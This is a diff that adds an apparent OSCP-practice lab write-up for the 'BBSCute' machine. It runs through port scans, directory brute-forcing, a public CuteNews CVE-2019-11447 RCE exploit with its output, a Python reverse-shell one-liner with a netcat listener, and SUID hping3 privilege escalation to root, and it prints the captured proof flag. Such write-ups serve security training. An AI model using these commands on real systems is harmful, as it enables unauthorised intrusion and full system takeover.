@@ -1325,3 +1325,175 @@ anaconda-ks.cfg  build.sh  proof.txt  run.sh
 sh-5.1# cat proof.txt 
 463f8f34a2898888a441146f17a163fb
 ```
+
+## BBSCute
+1. Rustscan 
+```
+PORT    STATE SERVICE      REASON
+22/tcp  open  ssh          syn-ack
+80/tcp  open  http         syn-ack
+88/tcp  open  kerberos-sec syn-ack
+110/tcp open  pop3         syn-ack
+995/tcp open  pop3s        syn-ack
+```
+
+2. Nmap 
+```
+nmap -p$(cat bbscute-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.185.128
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-15 23:35 EDT
+Nmap scan report for 192.168.185.128
+Host is up (0.30s latency).
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 04:d0:6e:c4:ba:4a:31:5a:6f:b3:ee:b8:1b:ed:5a:b7 (RSA)
+|   256 24:b3:df:01:0b:ca:c2:ab:2e:e9:49:b0:58:08:6a:fa (ECDSA)
+|_  256 6a:c4:35:6a:7a:1e:7e:51:85:5b:81:5c:7c:74:49:84 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+88/tcp  open  http     nginx 1.14.2
+|_http-title: 404 Not Found
+|_http-server-header: nginx/1.14.2
+110/tcp open  pop3     Courier pop3d
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-09-17T16:28:06
+|_Not valid after:  2021-09-17T16:28:06
+|_pop3-capabilities: USER PIPELINING IMPLEMENTATION(Courier Mail Server) UTF8(USER) TOP LOGIN-DELAY(10) STLS UIDL
+|_ssl-date: TLS randomness does not represent time
+995/tcp open  ssl/pop3 Courier pop3d
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-09-17T16:28:06
+|_Not valid after:  2021-09-17T16:28:06
+|_pop3-capabilities: USER PIPELINING IMPLEMENTATION(Courier Mail Server) TOP LOGIN-DELAY(10) UTF8(USER) UIDL
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.79 seconds
+```
+
+3. Directory bruteforce. 
+```
+python3 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://192.168.185.128/
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/kali/OSCP/pg/reports/http_192.168.185.128/__24-03-15_23-37-53.txt
+
+Target: http://192.168.185.128/
+
+[23:37:53] Starting: 
+[23:38:07] 403 -  280B  - /.ht_wsr.txt                                      
+[23:38:08] 403 -  280B  - /.htaccess.bak1                                   
+[23:38:08] 403 -  280B  - /.htaccess.sample                                 
+[23:38:08] 403 -  280B  - /.htaccess.orig
+[23:38:08] 403 -  280B  - /.htaccess.save                                   
+[23:38:08] 403 -  280B  - /.htaccess_extra                                  
+[23:38:08] 403 -  280B  - /.htaccess_orig
+[23:38:08] 403 -  280B  - /.htaccessOLD
+[23:38:08] 403 -  280B  - /.htaccess_sc
+[23:38:08] 403 -  280B  - /.htaccessBAK
+[23:38:08] 403 -  280B  - /.htaccessOLD2
+[23:38:08] 403 -  280B  - /.html                                            
+[23:38:08] 403 -  280B  - /.htm                                             
+[23:38:08] 403 -  280B  - /.htpasswds                                       
+[23:38:08] 403 -  280B  - /.htpasswd_test
+[23:38:08] 403 -  280B  - /.httr-oauth
+[23:38:12] 403 -  280B  - /.php                                             
+[23:39:07] 301 -  317B  - /core  ->  http://192.168.185.128/core/           
+[23:39:13] 301 -  317B  - /docs  ->  http://192.168.185.128/docs/           
+[23:39:13] 200 -    0B  - /docs/                                            
+[23:39:17] 200 -    3KB - /example.php                                      
+[23:39:19] 200 -    1KB - /favicon.ico                                      
+[23:39:28] 200 -    2KB - /index.php                                        
+[23:39:28] 200 -    2KB - /index.php/login/                                 
+[23:39:33] 301 -  317B  - /libs  ->  http://192.168.185.128/libs/           
+[23:39:33] 200 -    1KB - /LICENSE.txt                                      
+[23:39:38] 200 -  201B  - /manual/index.html                                
+[23:39:38] 301 -  319B  - /manual  ->  http://192.168.185.128/manual/
+[23:39:55] 200 -   28B  - /print.php                                        
+[23:39:58] 200 -    2KB - /README.md                                        
+[23:40:00] 200 -  118B  - /rss.php                                          
+[23:40:02] 200 -  756B  - /search.php                                       
+[23:40:03] 403 -  280B  - /server-status/                                   
+[23:40:03] 403 -  280B  - /server-status                                    
+[23:40:07] 301 -  318B  - /skins  ->  http://192.168.185.128/skins/         
+[23:40:18] 301 -  320B  - /uploads  ->  http://192.168.185.128/uploads/     
+[23:40:18] 200 -    0B  - /uploads/                                         
+                                                                             
+Task Completed
+               
+```
+
+4. Registration new account with sam:sam credentials. Find captcha at /captcha sub-directory. 
+```
+http://192.168.185.128/index.php/login 
+```
+
+5. Use credentials to RCE exploit. 
+```
+https://github.com/CRFSlick/CVE-2019-11447-POC
+
+python3 CVE-2019-11447.py sam sam http://192.168.185.128/index.php      
+-.-. --- --- .-..    .... ....- -..- --- .-.    -... .- -. -. . .-.
+[*] Detected version 'CuteNews 2.1.2'
+[*] Grabbing session cookie
+[*] Logging in as sam:sam
+[+] Login Success!
+[*] Grabbing __signature_key and __signature_dsi needed for pofile update request
+[+] __signature_key: 778ca102ae23f692bc9762271dd5ae35-sam
+[+] __signature_dsi: 9f6a434cc90d8bd9c5bc1fd319d2060f
+[*] Uploading evil avatar... Done!
+[*] Validating that the file was uploaded... Yup!
+[+] http://192.168.185.128/uploads/avatar_sam_32168.php?cmd=<cmd>
+[*] Looks like everything went smoothly, lets see if we have RCE!
+[*] Keep in mind that this shell is limited, no STDERR
+
+$> id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+6. Get better reverse shell. Other tools like bash, /bin/bash did not work. 
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.174",4449));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+
+nc -lvnp 4449
+listening on [any] 4449 ...
+connect to [192.168.45.174] from (UNKNOWN) [192.168.185.128] 39122
+www-data@cute:/var/www/html/uploads$ 
+```
+
+7. SUID check, did privilege escalation using it. 
+```
+find / -perm -u=s -type f 2>/dev/null
+/usr/sbin/hping3
+
+www-data@cute:/$ /usr/sbin/hping3
+/usr/sbin/hping3
+hping3> /bin/sh -p
+/bin/sh -p
+# whoami
+whoami
+root
+```
+
+8. Obtained proof.txt
+```
+# cd /root
+cd /root
+# ls
+ls
+proof.txt  root.txt
+# cat proof.txt
+cat proof.txt
+caf81d62fc06840089899268991d5ed4
+```
